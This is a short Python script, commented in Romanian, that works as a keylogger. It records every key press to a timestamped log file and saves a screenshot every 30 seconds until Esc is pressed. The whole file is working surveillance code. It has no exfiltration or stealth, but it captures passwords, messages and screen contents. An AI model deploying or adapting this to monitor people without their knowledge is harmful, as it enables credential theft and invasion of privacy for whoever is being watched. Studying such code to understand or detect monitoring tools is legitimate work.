import keyboard
import threading
import os
from datetime import datetime
import pyautogui
import time

# creaza folderul logs daca nu exista
if not os.path.isdir("logs"):
    os.mkdir("logs")
os.chdir("logs")  # schimba directorul curent in logs

exit_event = threading.Event()  # global flag

start_time = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
if not os.path.isdir(start_time):
    os.mkdir(start_time)
os.chdir(start_time)  # schimba directorul curent in logs/start_time


def on_key(event):  # functie apelata la apasarea unei taste
    key = event.name  # salveaza tasta apasata
    with open(f"{start_time}----keylog.txt", "a") as f:
        f.write(key + " ")  # scrie tasta in fisier

    if key == "esc":  # daca se apasa esc, se seteaza flagul de iesire
        exit_event.set()


def ss():
    count = 0
    while not exit_event.is_set():  # cat timp nu s-a apasat esc
        screenshot = pyautogui.screenshot()  # face screenshot
        screenshot.save(f"screenshot{count}.png")
        count += 1
        time.sleep(30)  # asteapta 30 de secunde

    # print("screenshot thread stopped") #debug


screenshot_thread = threading.Thread(target=ss)  # thread pentru screenshot
screenshot_thread.start()  # porneste threadul

keyboard.on_press(on_key)  # porneste keyloggerul

keyboard.wait("esc")  # asteapta apasarea tastei esc
screenshot_thread.join()  # asteapta terminarea threadului pentru screenshot
keyboard.unhook_all()  # opreste keyloggerul

# print("keylogger stopped")  # debug
with open(f"{start_time}----keylog.txt", "a") as f:
    f.write("\nkeylogger stopped")
